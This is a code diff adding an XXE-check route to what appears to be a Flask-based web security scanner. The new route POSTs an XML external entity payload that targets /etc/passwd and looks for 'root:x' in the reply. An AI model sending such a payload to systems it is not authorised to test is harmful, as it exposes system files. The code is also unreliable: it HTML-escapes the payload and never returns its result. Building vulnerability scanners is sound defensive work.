@@ -24,7 +24,9 @@ import math
 from flask import Flask, make_response
 from reportlab.pdfgen import canvas
 from fpdf import FPDF
-
+import requests
+from defusedxml import ElementTree as ET
+import html
 
 wd = "www.google.com"
 wm = ""
@@ -916,5 +918,30 @@ def cvelookup():
         print("check spelling bro", e)
     return(resdict)
 
+@app.route('/xxelookup')
+def xxelookup():
+    xxedict={}
+    url = 'https://'+wd
+    xml_payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+    xml_payload = html.escape(xml_payload)
 
+    headers = {
+        'Content-Type': 'application/xml',
+    }
+
+    response = requests.post(url, headers=headers, data=xml_payload)
+
+    if response.status_code == 200:
+        try:
+            root = ET.fromstring(response.text)
+            # Check for XXE vulnerability by looking for contents of /etc/passwd in the response
+            if 'root:x' in response.text:
+                xxedict.update({"XXEStatus":"XXE vulnerability found"})
+            else:
+                xxedict.update({"XXEStatus":"No XXE vulnerability found"})
+        except ET.ParseError:
+            xxedict.update({"XXEStatus":"Invalid XML response"})
+
+    else:
+        xxedict.update({"XXEStatus":response.status_code})
 app.run()
